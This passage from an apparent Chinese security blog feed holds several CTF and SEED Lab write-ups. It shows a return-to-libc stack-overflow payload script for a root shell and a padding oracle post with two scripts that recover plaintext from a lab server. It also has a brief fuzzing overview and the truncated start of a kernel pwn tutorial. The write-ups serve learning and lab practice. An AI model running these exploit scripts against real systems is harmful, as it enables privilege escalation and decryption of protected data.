size: %d\n&quot;</span>, length);</span><br><span class="line"></span><br><span class="line">   bof(input);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;(^_^)(^_^) Returned Properly (^_^)(^_^)\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现输入<code>input</code>长度可以达到1000，可以造成栈溢出攻击获取root shell。</p>
<img src="/posts/8a8d28bf/image-20231231145600873.png" class="" title="image-20231231145600873">

<p>另外发现docker镜像中已将zsh链接到sh，因此只需构造环境变量<code>/bin/sh</code>，使用<code>system(&#39;/bin/sh&#39;)</code>获取shell即可。<code>system</code>，<code>exit</code>地址如下。</p>
<img src="/posts/8a8d28bf/image-20231231152925920.png" class="" title="image-20231231152925920">

<p>根据vuln返回信息可以获取到input、buffer地址以及栈帧基址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">seed /home/seed % vuln</span><br><span class="line">Address of input[] inside main():  0xffffd8d0</span><br><span class="line">Input size: 66</span><br><span class="line">Address of buffer[] inside bof():  0xffffd7e4</span><br><span class="line">Frame Pointer value inside bof():  0xffffd8b8</span><br></pre></td></tr></table></figure>



<p>可以计算出从buffer需要溢出<code>0xffffd8b8-0xffffd7e4 = 212</code>个字节可以溢出到ebp。然后ebp返回地址上填入system地址，并添加参数和exit返回地址即可。</p>
<p>参数<code>/bin/sh</code>尝试使用环境变量实现。</p>
<img src="/posts/8a8d28bf/image-20231231153450024.png" class="" title="image-20231231153450024">

<p>构造脚本<code>genv.c</code>获取环境变量地址，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译genv并上传，获取到<code>/bin/sh</code>地址<code>0xffffdfd5</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 genv.c -o genv</span><br><span class="line">scp -P 49153 ./genv seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<img src="/posts/8a8d28bf/image-20231231153928103.png" class="" title="image-20231231153928103">

<p>构造python脚本，并上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">input_addr	= <span class="number">0xffffd8c0</span></span><br><span class="line">buffer_addr	= <span class="number">0xffffd7d4</span></span><br><span class="line">ebp_addr	= <span class="number">0xffffd8a8</span> </span><br><span class="line">system_addr	= <span class="number">0xf7e19360</span>   <span class="comment"># The address of system()</span></span><br><span class="line">exit_addr	= <span class="number">0xf7e0bec0</span></span><br><span class="line">sh_addr = <span class="number">0xffffdfd2</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">Y = ebp_addr - buffer_addr + <span class="number">4</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;the_file&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -P 49153 ./exp.py seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<p>修改文件权限并执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 exp.py</span><br><span class="line">chmod 755 the_file</span><br><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>

<p>其中发现”&#x2F;bin&#x2F;sh”环境变量存在偏移0x3，对exp.py稍作修改后重新运行，成功获取到root shell，获取到flag。</p>
<img src="/posts/8a8d28bf/image-20231231154624159.png" class="" title="image-20231231154624159">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Return</tag>
        <tag>to</tag>
        <tag>Pwn</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试分类</title>
    <url>/posts/34143959.html</url>
    <content><![CDATA[<p>根据程序执行反馈的获取情况，可以将模糊测试分为白盒、黑盒和灰盒三类</p>
<h2 id="一、白盒测试"><a href="#一、白盒测试" class="headerlink" title="一、白盒测试"></a>一、白盒测试</h2><p>白盒测试通过分析被测程序的内部机制和执行被测程序时收集的信息来生成测试用例，白盒测试通常会对程序进行动态污点分析或符号执行以获取精确的程序分析和状态信息。</p>
<h2 id="二、黑盒测试"><a href="#二、黑盒测试" class="headerlink" title="二、黑盒测试"></a>二、黑盒测试</h2><p>黑盒测试将测试对象当作黑盒，按照指定的规范随机生成测试用例。不提前分析程序内部机制也不接受反馈信息来更新测试用例。</p>
<h2 id="三、灰盒测试"><a href="#三、灰盒测试" class="headerlink" title="三、灰盒测试"></a>三、灰盒测试</h2><p>灰盒测试的典型特点就是可以使用目标的执行反馈来指导测试用例的生成。</p>
<img src="/posts/34143959/image-20240103104937168.png" class="" title="image-20240103104937168">]]></content>
      <tags>
        <tag>Fuzz</tag>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】Magic Padding Oracle实验报告</title>
    <url>/posts/8f883717.html</url>
    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
<h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="2. Lab Environment"></a>2. Lab Environment</h2><ul>
<li>Seed虚拟机</li>
<li>Labsetup.zip</li>
</ul>
<p>使用<code>dcbuild</code>和<code>dcup</code>命令启动docker环境</p>
<h2 id="3-Task1：Getting-Familiar-with-Padding"><a href="#3-Task1：Getting-Familiar-with-Padding" class="headerlink" title="3. Task1：Getting Familiar with Padding"></a>3. Task1：Getting Familiar with Padding</h2><p>Padding：分组加密算法要求明文长度需要为分组长度的整数倍。因此需要padding填充末尾使长度满足要求</p>
<p>使用<code>echo -n</code>创建文件P，长度为5。<code>-n</code>参数表示结尾不带换行符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n &quot;12345&quot; &gt; P</span><br></pre></td></tr></table></figure>

<p>使用openssl命令对文件进行加密，并且对加密文件解密查看padding</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加密</span></span><br><span class="line">openssl enc -aes-128-cbc -e -in P -out C</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">openssl enc -aes-128-cbc -d -nopad -in C -out P_new</span><br></pre></td></tr></table></figure>

<p>结果如下，可以看出P_new文件内容末尾出现<code>&#39;\x0a&#39;</code>，文件长度变为16。表明加密过程进行了padding <code>&#39;\x0a&#39;</code>字符到16位的操作。</p>
<img src="/posts/8f883717/image-20231230192916386.png" class="" title="image-20231230192916386">

<p>分别尝试文件长度为10， 16的文件，结果如下，可以得出padding规律（要填充的位数作为填充字符）</p>
<img src="/posts/8f883717/image-20231230193317519.png" class="" title="image-20231230193317519">

<h2 id="4-Task2：Padding-Oracle-Attack（level-1）"><a href="#4-Task2：Padding-Oracle-Attack（level-1）" class="headerlink" title="4. Task2：Padding Oracle Attack（level 1）"></a>4. Task2：Padding Oracle Attack（level 1）</h2><p> 连接server端，获取到IV与密文</p>
<img src="/posts/8f883717/image-20231230193641177.png" class="" title="image-20231230193641177">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">01020304050607080102030405060708	# IV</span><br><span class="line">a9b2554b0944118061212098f2f238cd779ea0aae3d9d020f3677bfcb3cda9ce # ciphertext</span><br></pre></td></tr></table></figure>

<p>可以与server交互，向server发送输入，输入应为IV+密文，server会使用其K和IV解密，并且返回padding是否有效。尝试通过返回信息来得出密文的真实内容。</p>
<p>server端对密文解密过程如下，为CBC模式。padding oracle攻击的原理为假设未知Plaintext P2的填充位为0x01，那么可以通过构造C1来与D2异或使解密的P2填充位为0x01，此时server端会返回Valid信息，可以解出未知的D2.当D2完全解出时，即可使用正确C1与D2异或获取明文。</p>
<img src="/posts/8f883717/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbGVjYWx0ZWNo,size_16,color_FFFFFF,t_70.png" class="" title="在这里插入图片描述">

<p><code>manual_attack.py</code>脚本如下，对通过尝试C1末位256种字符解出D2末位值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    IV    = iv_and_ctext[<span class="number">00</span>:<span class="number">16</span>]</span><br><span class="line">    C1    = iv_and_ctext[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 1st block of ciphertext</span></span><br><span class="line">    C2    = iv_and_ctext[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 2nd block of ciphertext</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C1:  &quot;</span> + C1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C2:  &quot;</span> + C2.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># Here, we initialize D2 with C1, so when they are XOR-ed,</span></span><br><span class="line">    <span class="comment"># The result is 0. This is not required for the attack.</span></span><br><span class="line">    <span class="comment"># Its sole purpose is to make the printout look neat.</span></span><br><span class="line">    <span class="comment"># In the experiment, we will iteratively replace these values.</span></span><br><span class="line">    D2 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    D2[<span class="number">0</span>]  = C1[<span class="number">0</span>]</span><br><span class="line">    D2[<span class="number">1</span>]  = C1[<span class="number">1</span>]</span><br><span class="line">    D2[<span class="number">2</span>]  = C1[<span class="number">2</span>]</span><br><span class="line">    D2[<span class="number">3</span>]  = C1[<span class="number">3</span>]</span><br><span class="line">    D2[<span class="number">4</span>]  = C1[<span class="number">4</span>]</span><br><span class="line">    D2[<span class="number">5</span>]  = C1[<span class="number">5</span>]</span><br><span class="line">    D2[<span class="number">6</span>]  = C1[<span class="number">6</span>]</span><br><span class="line">    D2[<span class="number">7</span>]  = C1[<span class="number">7</span>]</span><br><span class="line">    D2[<span class="number">8</span>]  = C1[<span class="number">8</span>]</span><br><span class="line">    D2[<span class="number">9</span>]  = C1[<span class="number">9</span>]</span><br><span class="line">    D2[<span class="number">10</span>] = C1[<span class="number">10</span>]</span><br><span class="line">    D2[<span class="number">11</span>] = C1[<span class="number">11</span>]</span><br><span class="line">    D2[<span class="number">12</span>] = C1[<span class="number">12</span>]</span><br><span class="line">    D2[<span class="number">13</span>] = C1[<span class="number">13</span>]</span><br><span class="line">    D2[<span class="number">14</span>] = C1[<span class="number">14</span>]</span><br><span class="line">    D2[<span class="number">15</span>] = C1[<span class="number">15</span>]</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In the experiment, we need to iteratively modify CC1</span></span><br><span class="line">    <span class="comment"># We will send this CC1 to the oracle, and see its response.</span></span><br><span class="line">    CC1 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    CC1[<span class="number">0</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">1</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">2</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">3</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">4</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">5</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">6</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">7</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">8</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">9</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">10</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">11</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">12</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">13</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">14</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">15</span>] = <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In each iteration, we focus on one byte of CC1.  </span></span><br><span class="line">    <span class="comment"># We will try all 256 possible values, and send the constructed</span></span><br><span class="line">    <span class="comment"># ciphertext CC1 + C2 (plus the IV) to the oracle, and see </span></span><br><span class="line">    <span class="comment"># which value makes the padding valid. </span></span><br><span class="line">    <span class="comment"># As long as our construction is correct, there will be </span></span><br><span class="line">    <span class="comment"># one valid value. This value helps us get one byte of D2. </span></span><br><span class="line">    <span class="comment"># Repeating the method for 16 times, we get all the 16 bytes of D2.</span></span><br><span class="line"></span><br><span class="line">    K = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">          CC1[<span class="number">16</span> - K] = i</span><br><span class="line">          status = oracle.decrypt(IV + CC1 + C2)</span><br><span class="line">          <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;CC1: &quot;</span> + CC1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">    P2 = xor(C1, D2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P2:  &quot;</span> + P2.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>运行后可得结果，可以看到成功解出C1末位为0xcf时，padding正确，所以可以得出D2末位为<code>0xcf xor 0x01 = 0xce</code>：</p>
<img src="/posts/8f883717/image-20231231105351823.png" class="" title="image-20231231105351823">

<p>然后修改C1末位为<code>0xce xor 0x02</code>尝试C1倒数第二位解出使padding为0x02的valid情况，得到D2后两位<code>0x3b0xce</code></p>
<img src="/posts/8f883717/image-20231231105716391.png" class="" title="image-20231231105716391">

<p>以此类推，可以得出D2值以及P2值：</p>
<img src="/posts/8f883717/image-20231231111128460.png" class="" title="image-20231231111128460">

<h2 id="5-Task-3：Padding-Oracle-Attack（Level-2）"><a href="#5-Task-3：Padding-Oracle-Attack（Level-2）" class="headerlink" title="5. Task 3：Padding Oracle Attack（Level 2）"></a>5. Task 3：Padding Oracle Attack（Level 2）</h2><p>自动化进程，并获取所有分组的密文。</p>
<p>构造脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    <span class="comment"># Num of ctext</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">len</span>(iv_and_ctext)/<span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        C = iv_and_ctext[(n)*<span class="number">16</span>: (n+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV:  &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C<span class="subst">&#123;n&#125;</span>: &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># initialize D, IV, P</span></span><br><span class="line">        D = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        CC = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        P = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Solve D</span></span><br><span class="line">        <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                CC[<span class="number">16</span> - K] = i</span><br><span class="line">                <span class="comment"># initialize input</span></span><br><span class="line">                tmp_input = iv_and_ctext[<span class="number">0</span>:(n+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">                tmp_input[n*<span class="number">16</span>:(n+<span class="number">1</span>)*<span class="number">16</span>] = CC</span><br><span class="line">                status = oracle.decrypt(tmp_input)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;D: &quot;</span>+ D.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;CC: &quot;</span> + CC.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="comment"># Update D</span></span><br><span class="line">                    D[<span class="number">16</span> - K] = i^K</span><br><span class="line">                    <span class="comment"># Update CC</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K+<span class="number">1</span>):</span><br><span class="line">                        CC[<span class="number">16</span> - j] = D[<span class="number">16</span> - j]^(K+<span class="number">1</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">        P = xor(C, D)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P:  &quot;</span> + P.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            plain_text += <span class="built_in">chr</span>(P[j])</span><br><span class="line">            </span><br><span class="line">       </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plaintext: &quot;</span> + plain_text) </span><br></pre></td></tr></table></figure>

<img src="/posts/8f883717/image-20231231130753727.png" class="" title="image-20231231130753727">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>密码</tag>
        <tag>Padding</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn 学习之路(一)</title>
    <url>/posts/54828bfc.html</url>
    <content><![CDATA[<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/140338884">Kernel Pwn 学习之路（一）</a></p>
<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文主要介绍Kernel的相关知识以及栈溢出在Kernel中的利用。</p>
<h2 id="2-Kernel简介"><a href="#2-Kernel简介" class="headerlink" title="2. Kernel简介"></a>2. Kernel简介</h2><p><strong>本部分全文引用了CTF-Wiki的相关内容。</strong></p>
<h3 id="2-1-什么是Kernel"><a href="#2-1-什么是Kernel" class="headerlink" title="2.1 什么是Kernel"></a>2.1 什么是Kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据I&#x2F;O请求，讲这些要求转译为指令，交给CPU和计算机中的其他组件处理，kernel是现代操作系统最基本的部分。</p>
<p>Kernel最主要的功能有以下两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供application能运行的环境</li>
</ul>
<p>包括I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是：<strong>kernel的crash通常会引起重启</strong></p>
<h3 id="2-2-Ring-模型"><a href="#2-2-Ring-模型" class="headerlink" title="2.2 Ring 模型"></a>2.2 Ring 模型</h3><p>intel CPU 将CPU的特权级别分为4个级别：Ring 0， Ring1，… ，Ring3。</p>
<p>Ring0只给OS使用，Ring3所有程序都可以使用，内层Ring可以随便使用外层Ring的资源。提升系统安全性</p>
<p>大多数操作系统只使用了Ring0，Ring3。</p>
<h3 id="2-3-状态切换"><a href="#2-3-状态切换" class="headerlink" title="2.3 状态切换"></a>2.3 状态切换</h3><h4 id="User-space-to-kernel-space"><a href="#User-space-to-kernel-space" class="headerlink" title="User space to kernel space"></a>User space to kernel space</h4><p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体过程为：</p>
<ol>
<li><p>通过swapgs切换GS段寄存器，将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行的GS值使用。</p>
</li>
<li><p>将当前栈顶（用户控件栈顶）记录在CPU独占变量区域中，将CPU独占区域里记录的内核栈顶放入RSP&#x2F;ESP</p>
</li>
<li><p>通过push保存各寄存器值，具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* 保存栈值，并设置内核栈 */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax 